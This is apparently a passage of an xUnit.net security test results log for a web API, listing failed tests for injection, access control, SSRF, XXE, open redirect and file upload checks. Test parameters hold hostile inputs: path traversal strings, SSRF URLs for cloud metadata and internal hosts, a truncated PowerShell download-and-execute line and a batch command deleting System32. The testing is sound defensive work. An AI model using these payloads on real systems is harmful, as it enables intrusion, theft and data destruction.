        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo2_Configuracion.G2_Misc_Asserts.B08_Pagination_ProductsEndpoint_ShouldReturnPaginatedResponse [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2356983-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo3_Inyeccion.G3_SQLi_Asserts.A08_SQLi_SearchWithOrPayload_ShouldNotReturnAllRecords [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2359949-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo1_ControlAcceso.G1_MassAssignment_Asserts.A05_MassAssignment_UserCannotElevateOwnRole_ShouldNotPersistAdminRole [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2364197-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo3_Inyeccion.G3_PathTraversal_Asserts.A13b_PathTraversal_EncodedPayloads_ShouldNotReturn200(payload: "../../appsettings.json") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2367728-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo8_Webhooks.G8_WebhookHmac_Asserts.A26_Webhook_WithoutHmacSignature_ShouldReturn401 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2375337-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo5_Servidor.G5_DebugInfo_Asserts.A16c_DebugInfo_ShouldNotExposeEnvironmentVariables [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2454585-05:00">
        <Text>[xUnit.net 00:00:00.27]     SecurityAsserts.Grupo3_Inyeccion.G3_XSS_Asserts.A09_XSS_CategoryPayload_ShouldNotReflectScriptInBody [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2455890-05:00">
        <Text>[xUnit.net 00:00:00.27]     SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(callbackUrl: "http://10.0.0.1/", description: "RFC 1918 clase A") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2456995-05:00">
        <Text>[xUnit.net 00:00:00.27]     SecurityAsserts.Grupo6_Archivos.G6_FileUpload_Asserts.A14b_FileUpload_OversizedFile_ShouldReturn413 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2467084-05:00">
        <Text>[xUnit.net 00:00:00.27]     SecurityAsserts.Grupo1_ControlAcceso.G1_BFLA_Asserts.A06_BFLA_UserRoleCannotDeleteOtherUser_ShouldReturn403 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2468640-05:00">
        <Text>[xUnit.net 00:00:00.27]     SecurityAsserts.Grupo7_Reportes.G7_XXE_Asserts.A22_XXE_LocalFileEntity_ShouldBeRejected [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2480377-05:00">
        <Text>[xUnit.net 00:00:00.27]     SecurityAsserts.Grupo4_Infraestructura.G4_TLS_Asserts.C02_TLS_MinimumVersion_ShouldBeTls12 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2483166-05:00">
        <Text>[xUnit.net 00:00:00.27]     SecurityAsserts.Grupo7_Reportes.G7_OpenRedirect_Asserts.A23_OpenRedirect_ExternalUrl_ShouldReturn400(returnUrl: "https://evil.example.com/phishing", description: "dominio externo") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2484786-05:00">
        <Text>[xUnit.net 00:00:00.27]     SecurityAsserts.Grupo8_Webhooks.G8_WebhookHmac_Asserts.A26b_Webhook_WithInvalidHmacSignature_ShouldReturn401 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2486798-05:00">
        <Text>[xUnit.net 00:00:00.27]     SecurityAsserts.Grupo5_Servidor.G5_DebugInfo_Asserts.A16b_DebugInfo_ShouldNotExposeConnectionString [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2507704-05:00">
        <Text>[xUnit.net 00:00:00.27]     SecurityAsserts.Grupo7_Reportes.G7_OpenRedirect_Asserts.A23_OpenRedirect_ExternalUrl_ShouldReturn400(returnUrl: "https://attacker.io/steal-token", description: "dominio atacante") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2509896-05:00">
        <Text>[xUnit.net 00:00:00.27]     SecurityAsserts.Grupo6_Archivos.G6_FileUpload_Asserts.A14_FileUpload_ExecutableExtension_ShouldReturn400Or415(fileName: "shell.ps1", content: "Invoke-Expression (New-Object Net.WebClient).Downl"···) [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2511648-05:00">
        <Text>[xUnit.net 00:00:00.27]     SecurityAsserts.Grupo7_Reportes.G7_XXE_Asserts.A22b_XXE_LocalFileEntity_ResponseShouldNotContainFileContent [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2534108-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo3_Inyeccion.G3_PathTraversal_Asserts.A13b_PathTraversal_EncodedPayloads_ShouldNotReturn200(payload: "..%2F..%2Fappsettings.json") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2536100-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo1_ControlAcceso.G1_BFLA_Asserts.A06b_BFLA_UserRoleCannotPromoteOtherUser_ShouldReturn403 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2537727-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo6_Archivos.G6_JWTQueryString_Asserts.A17_JWT_TokenInQueryString_ShouldNotGrantAccess [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2541415-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo1_ControlAcceso.G1_BOLA_Asserts.A02_BOLA_GetOrder_UserAAccessingUserBOrder_ShouldReturn403Or404 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2548246-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo1_ControlAcceso.G1_SensitiveData_Asserts.A18b_SensitiveData_GetMe_ShouldNotExposePasswordOrInternalFields [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2556214-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(callbackUrl: "http://127.0.0.1:5985/wsman", description: "loopback WinRM") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2574136-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo2_Configuracion.G2_Headers_Asserts.B03_Headers_ContentSecurityPolicy_ShouldBePresent [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2575832-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo1_ControlAcceso.G1_IDOR_Asserts.A19_IDOR_UpdateOtherUserProfile_ShouldReturn403 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2578414-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo5_Servidor.G5_DebugInfo_Asserts.A16_DebugInfo_WithoutAuth_ShouldReturn401Or404 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2579867-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo7_Reportes.G7_OpenRedirect_Asserts.A23_OpenRedirect_ExternalUrl_ShouldReturn400(returnUrl: "//evil.example.com/", description: "protocol-relative") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2581231-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo4_Infraestructura.G4_TLS_Asserts.A10_TLS_HttpRequest_ShouldRedirectToHttps [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2595039-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo7_Reportes.G7_XXE_Asserts.A22c_XXE_SsrfViaXml_ShouldNotLeakCloudMetadata [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2596495-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo1_ControlAcceso.G1_IDOR_Asserts.A21_IDOR_DeleteOtherUserOrder_ShouldReturn403Or404 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2597704-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo5_Servidor.G5_DebugInfo_Asserts.A16d_HealthVerbose_ShouldNotExposeRuntimeVersion [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2599083-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo3_Inyeccion.G3_PathTraversal_Asserts.A13b_PathTraversal_EncodedPayloads_ShouldNotReturn200(payload: "%2e%2e/%2e%2e/appsettings.json") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2601912-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo6_Archivos.G6_FileUpload_Asserts.A14_FileUpload_ExecutableExtension_ShouldReturn400Or415(fileName: "cmd.bat", content: "@echo off &amp; del /f /q C:\\Windows\\System32") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2603917-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(callbackUrl: "http://192.168.1.1/admin", description: "RFC 1918") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2625408-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo1_ControlAcceso.G1_SensitiveData_Asserts.A18c_SensitiveData_AdminEndpoint_ShouldNotReturnPasswordsInBulk [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2627637-05:00">
        <Text>[xUnit.net 00:00:00.28]     SecurityAsserts.Grupo2_Configuracion.G2_Headers_Asserts.B01_Headers_XContentTypeOptions_ShouldBeNoSniff [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2629136-05:00">
        <Text>[xUnit.net 00:00:00.29]     SecurityAsserts.Grupo2_Configuracion.G2_Misc_Asserts.B09_RateLimit_AuthEndpoint_ShouldReturn429AfterExcessRequests [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2631156-05:00">
        <Text>[xUnit.net 00:00:00.29]     SecurityAsserts.Grupo3_Inyeccion.G3_PathTraversal_Asserts.A13c_PathTraversal_ConfigFile_ShouldNotExposeContent [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2632780-05:00">
        <Text>[xUnit.net 00:00:00.29]     SecurityAsserts.Grupo2_Configuracion.G2_Misc_Asserts.B07_Swagger_ShouldNotBeAccessibleInProduction [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2633941-05:00">
        <Text>[xUnit.net 00:00:00.29]     SecurityAsserts.Grupo6_Archivos.G6_FileUpload_Asserts.A14_FileUpload_ExecutableExtension_ShouldReturn400Or415(fileName: "backdoor.aspx", content: "&lt;%@ Page Language=\"C#\" %&gt;") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2651405-05:00">
        <Text>[xUnit.net 00:00:00.29]     SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(callbackUrl: "file:///C:/Windows/win.ini", description: "file scheme") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2653433-05:00">
        <Text>[xUnit.net 00:00:00.29]     SecurityAsserts.Grupo2_Configuracion.G2_Headers_Asserts.B02_Headers_XFrameOptions_ShouldBeDenyOrSameOrigin [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2682700-05:00">
        <Text>[xUnit.net 00:00:00.29]     SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(callbackUrl: "http://169.254.169.254/latest/meta-data/", description: "AWS metadata") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2690792-05:00">
        <Text>[xUnit.net 00:00:00.29]     SecurityAsserts.Grupo6_Archivos.G6_FileUpload_Asserts.A14_FileUpload_ExecutableExtension_ShouldReturn400Or415(fileName: "malware.exe", content: "MZ\0\x03") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2694970-05:00">
        <Text>[xUnit.net 00:00:00.29]     SecurityAsserts.Grupo3_Inyeccion.G3_PathTraversal_Asserts.A13_PathTraversal_DownloadOutsideBaseDir_ShouldReturn400Or403 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2698510-05:00">
        <Text>[xUnit.net 00:00:00.29]     SecurityAsserts.Grupo2_Configuracion.G2_Headers_Asserts.B05_Headers_XPoweredBy_ShouldNotBePresent [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2717991-05:00">
        <Text>[xUnit.net 00:00:00.29]     SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27_WebhookSsrf_PrivateCallbackUrl_ShouldReturn400(callbackUrl: "http://172.16.0.1/", description: "RFC 1918 clase B") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2760801-05:00">
        <Text>[xUnit.net 00:00:00.30]     SecurityAsserts.Grupo6_Archivos.G6_FileUpload_Asserts.A14c_FileUpload_TraversalInFileName_ShouldNotSaveOutsideBaseDir [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2799301-05:00">
        <Text>[xUnit.net 00:00:00.30]     SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27b_WebhookSsrf_LoopbackUrl_ResponseShouldNotLeakInternalData [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:10.2226302-05:00">
        <Text>[xUnit.net 00:00:02.25]     SecurityAsserts.Grupo5_Servidor.G5_SSRF_Asserts.A15b_SSRF_PingEndpointRequiresAuthentication [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:15.2300844-05:00">
        <Text>[xUnit.net 00:00:07.25]     SecurityAsserts.Grupo5_Servidor.G5_SSRF_Asserts.A15_SSRF_PrivateRangeUrl_ShouldReturn400Or403(url: "http://169.254.169.254/latest/", description: "AWS metadata") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:15.2342910-05:00">
        <Text>[xUnit.net 00:00:07.26]     SecurityAsserts.Grupo5_Servidor.G5_SSRF_Asserts.A15_SSRF_PrivateRangeUrl_ShouldReturn400Or403(url: "file:///C:/Windows/win.ini", description: "file scheme") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:17.2871952-05:00">
        <Text>[xUnit.net 00:00:09.31]     SecurityAsserts.Grupo5_Servidor.G5_SSRF_Asserts.A15_SSRF_PrivateRangeUrl_ShouldReturn400Or403(url: "http://127.0.0.1:5985/", description: "loopback WinRM") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:19.3266208-05:00">
        <Text>[xUnit.net 00:00:11.35]     SecurityAsserts.Grupo5_Servidor.G5_SSRF_Asserts.A15_SSRF_PrivateRangeUrl_ShouldReturn400Or403(url: "http://192.168.1.1/", description: "RFC 1918") [FAIL]</Text>
      </RunInfo>
    </RunInfos>
  </ResultSummary>
</TestRun>